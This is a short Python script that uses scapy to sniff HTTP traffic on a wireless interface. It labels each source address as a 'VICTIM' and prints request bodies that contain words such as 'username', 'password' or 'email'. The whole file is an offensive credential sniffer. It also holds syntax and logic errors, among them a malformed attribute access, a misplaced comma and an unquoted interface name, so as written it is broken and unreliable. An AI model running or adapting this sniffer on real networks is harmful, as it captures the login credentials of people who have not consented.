#!/usr/bin/env python3

from scapy.all import *
from scapy_http import http
from colorama import Fore, init

init()

wordlist = ["email", "username", "user", "password","passwd"]

def capture_http(packet):
    
    if packet.haslayer(http.HTTPRequest):
        print("[+] VICTIM: " + packet[IP].src, + " IP Destiny: " + packet[IP].dst + "Domain: " + packet.[http.HTTPRequest].Host)
        if packet.haslayer(Raw):
            load = packet[Raw].load
            load = load.lower()
            for e in wordlist:
                if e in load:
                    print(Fore.LIGHTRED_EX + " Find data: " + load)

def main():
    
    print("--- [{}+{}] Sniffing packages...".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
    sniff(iface=wlo1, store=False, prn=capture_http)

if __name__ == '__main__':
    main()
